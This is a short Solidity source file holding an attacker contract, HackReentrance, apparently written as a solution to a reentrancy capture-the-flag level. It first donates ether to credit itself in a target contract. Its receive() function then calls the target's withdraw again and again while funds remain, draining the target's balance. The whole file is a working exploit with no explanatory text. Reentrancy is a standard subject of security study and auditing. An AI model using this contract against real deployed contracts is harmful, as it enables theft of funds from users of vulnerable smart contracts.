// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @dev Basic attacker contract for reentrancy
contract HackReentrance {
    address reentrance;

    constructor(address _reentrance) {
        reentrance = _reentrance;
    }

    // increase my own balance to be able to trigger withdraw
    function donateToMe() external payable {
        (bool success,) = reentrance.call{value: msg.value}(abi.encodeWithSignature("donate(address)", address(this)));
        require(success);
    }

    receive() external payable { 
        if (address(msg.sender).balance >= 0.001 ether) {
            withdrawAttack(0.001 ether);
        }
    }

    function withdrawAttack(uint256 amout) public {
        (bool success,) = reentrance.call(abi.encodeWithSignature("withdraw(uint256)", amout));
        require(success);
    }
}